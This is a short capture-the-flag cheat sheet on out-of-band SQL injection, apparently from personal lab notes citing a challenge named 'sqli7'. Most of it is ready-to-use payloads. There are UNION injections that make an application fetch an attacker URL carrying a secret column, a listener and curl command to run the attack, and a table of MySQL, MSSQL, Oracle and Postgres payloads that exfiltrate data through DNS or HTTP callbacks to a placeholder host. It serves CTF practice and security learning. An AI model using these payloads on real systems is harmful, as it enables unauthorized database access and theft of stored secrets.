# Out-of-band SQLi (make the server send you the data)

**Signs**: nothing useful returned, but the **application or DB performs a network action** with a
value from the query: fetches a URL (link preview, webhook), sends email, resolves a hostname.
Hint "we fetch the link for you… send it somewhere you can see".

## App-level OOB (any DBMS)
If the app fetches every URL the query returns, UNION a row whose URL column is *your* server +
the secret:
```sql
-- SQLite / Postgres concat ||
0 UNION SELECT 'http://YOUR_IP:443/?d=' || secret, 'x', 0 FROM vault --
-- MySQL
0 UNION SELECT CONCAT('http://YOUR_IP/?d=',secret),'x',0 FROM vault-- -
```
```bash
sudo python scripts/xss/catch_server.py --port 443            # or 80; lab egress = 80/443 only
curl -s "$T/l/$(python -c "import urllib.parse;print(urllib.parse.quote(\"0 UNION SELECT 'http://YOUR_IP:443/?d=' || secret, 'x', 0 FROM vault -- \",safe=''))")"
```
Your listener logs `GET /?d=flag{...}`. YOUR_IP must be reachable **from the challenge container**:
your VPN/lab IP; locally with Docker use the bridge gateway (`docker network inspect bridge`,
often `172.17.0.1`) or `host.docker.internal`.
→ [tools/oob-listeners.md](../tools/oob-listeners.md)

## DB-level OOB
| DBMS | Payload |
|---|---|
| MySQL (Windows, FILE priv) | `LOAD_FILE(CONCAT('\\\\',(SELECT secret FROM vault),'.YOURDOMAIN\\x'))` (DNS) |
| MSSQL | `EXEC master..xp_dirtree '\\'+(SELECT TOP 1 secret FROM vault)+'.YOURDOMAIN\x'` |
| Oracle | `UTL_HTTP.request('http://YOU/'||(SELECT ...))`, `UTL_INADDR.get_host_address(...)` |
| Postgres | `COPY (SELECT '') TO PROGRAM 'curl http://YOU/?d='||...` (superuser) |
Use an interactsh/Burp Collaborator domain for DNS callbacks.

Seen in: `sqli7` (Linkly: `/l/<n>` → `SELECT url, note, id FROM links WHERE id = <n>`, app GETs the url).
